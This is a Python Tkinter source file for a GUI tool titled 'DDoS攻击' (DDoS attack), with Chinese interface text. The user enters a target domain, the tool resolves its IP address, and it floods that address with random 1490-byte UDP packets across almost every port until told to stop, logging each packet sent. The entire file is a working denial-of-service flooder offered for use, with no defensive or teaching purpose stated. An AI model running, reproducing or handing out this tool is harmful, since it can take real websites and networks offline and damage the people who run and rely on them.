import tkinter as tk
from tkinter import ttk
import socket
import random
import threading
from datetime import datetime

class DDoSApp:
    def __init__(self, root):
        self.root = root
        self.root.geometry("550x560")
        self.root.title("DDoS攻击")

        self.create_widgets()

        self.stop_event = threading.Event()

    def create_widgets(self):
        ttk.Label(self.root, text="攻击目标(域名，不加https://):", font=(("",20,""))).pack(pady=10)
        
        self.entry = ttk.Entry(self.root)
        self.entry.pack()

        self.start_button = ttk.Button(self.root, text="攻击", command=self.start_attack)
        self.start_button.pack(pady=10)
        
        self.text_widget = tk.Text(self.root, height=20, width=60)
        self.text_widget.pack(padx=10, pady=10)

        self.stop_button = ttk.Button(self.root, text="停止", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack()

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def get_ip(self, domain):
        try:
            ip_address = socket.gethostbyname(domain)
            return ip_address
        except socket.gaierror:
            return None

    def attack(self, domain):
        ip = self.get_ip(domain)
        if ip is None:
            self.text_widget.insert(tk.END, f"无法找到域名: {domain}的IP地址,请检查地址和网络\n")
            return
        
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            bytes = random._urandom(1490)
            port = 1
            sent = 0
            while not self.stop_event.is_set():
                sock.sendto(bytes, (ip, port))
                msg = f"Sent {sent} packet to {ip} through port: {port}\n"
                self.text_widget.insert(tk.END, msg)
                self.text_widget.see(tk.END)  # 滚动到最后一行
                sent += 1
                port += 1
                if port == 65534:
                    port = 1

    def start_attack(self):
        domain = self.entry.get()
        if domain.strip() == "":
            return
        
        self.thread = threading.Thread(target=self.attack, args=(domain,))
        self.thread.start()

        # 禁用攻击按钮和启动按钮防止重复点击
        self.start_button["state"] = tk.DISABLED
        self.stop_button["state"] = tk.NORMAL

    def stop_attack(self):
        self.stop_event.set()  # 设置停止事件
        self.stop_button["state"] = tk.DISABLED
        self.start_button["state"] = tk.NORMAL

    def on_closing(self):
        self.stop_event.set()  # 设置停止事件
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = DDoSApp(root)
    root.mainloop()
